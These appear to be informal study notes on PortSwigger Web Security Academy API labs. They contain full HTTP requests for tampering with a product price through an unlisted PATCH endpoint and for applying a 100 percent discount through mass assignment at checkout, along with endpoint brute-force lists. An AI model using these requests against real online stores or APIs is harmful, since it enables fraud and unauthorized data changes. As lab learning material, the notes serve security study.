PATCH /api/products/1/price HTTP/2        (first find /api endpoint then try OPTION see allow what PATCH,GET,POST,PUT,HEAD?) or u can bruteforce both the method and endpoint

PUT /api/user/delete
PUT /api/user/update
PUT /api/user/create
PUT /api/user/add
PUT /api/user/remove
PUT /api/user/disable
PUT /api/user/enable
PUT /api/user/password
PUT /api/user/profile
PUT /api/user/settings


Host: 0ab9003904b7e3498368507800350075.web-security-academy.net

Cookie: session=BwRdpnXkT5PsrTPSLaGRgyX1GtnAmAah

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/json (second saw it show error msg only accept this content-type we add it (rmb no space))

Referer: https://0ab9003904b7e3498368507800350075.web-security-academy.net/product?productId=1

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers 

Content-Length: 15



{"price":0} (last it show server internal error 500 we inject {} below and skip a line with all header content it show error msg price parameter missing we set price to 0 done)

MASS ASSIGMENT VULNERABILITY(developer does not whitelist) u can actualy modify the API JSON



POST /api/checkout HTTP/2

Host: 0adb001104ca2e6b81dab786008f0027.web-security-academy.net

Cookie: session=7tIGt0dlvmseqyg0OTI6NdYqlB3pDV6l

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: https://0adb001104ca2e6b81dab786008f0027.web-security-academy.net/cart

Content-Type: text/plain;charset=UTF-8

Content-Length: 92

Origin: https://0adb001104ca2e6b81dab786008f0027.web-security-academy.net

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: same-origin

Te: trailers



{"chosen_discount":{"percentage":100},( when i change post to get it show this so i paste to post to set 100perc discount and done)

"chosen_products":[{"product_id":"1","quantity":1}]}


SERVER SIDE PARAMETER POLLUTION
website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, 
